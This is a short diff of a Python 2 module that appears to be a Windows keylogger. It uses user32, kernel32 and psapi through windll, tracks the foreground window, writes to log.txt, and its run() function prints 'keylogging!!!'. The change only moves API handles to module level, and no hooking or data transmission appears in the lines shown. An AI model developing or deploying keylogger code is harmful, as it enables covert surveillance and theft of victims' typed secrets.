@@ -16,6 +16,11 @@ import time
 import urllib2
 import urllib
 
+user32 = windll.user32
+kernel32 = windll.kernel32
+psapi = windll.psapi
+current_window = None
+
 
 def get_current_process():
     # get a handle to the foreground window
@@ -117,12 +122,8 @@ def inform():
 
 
 def run(**args):
-   print "keylogging!!!"
-   user32 = windll.user32
-   kernel32 = windll.kernel32
-   psapi = windll.psapi
    st_time = time.time()
-   current_window = None
+   print "keylogging!!!"
    f_des = open("log.txt" , "w")
    f_des.write("Started!!\n")
    f_des.close()
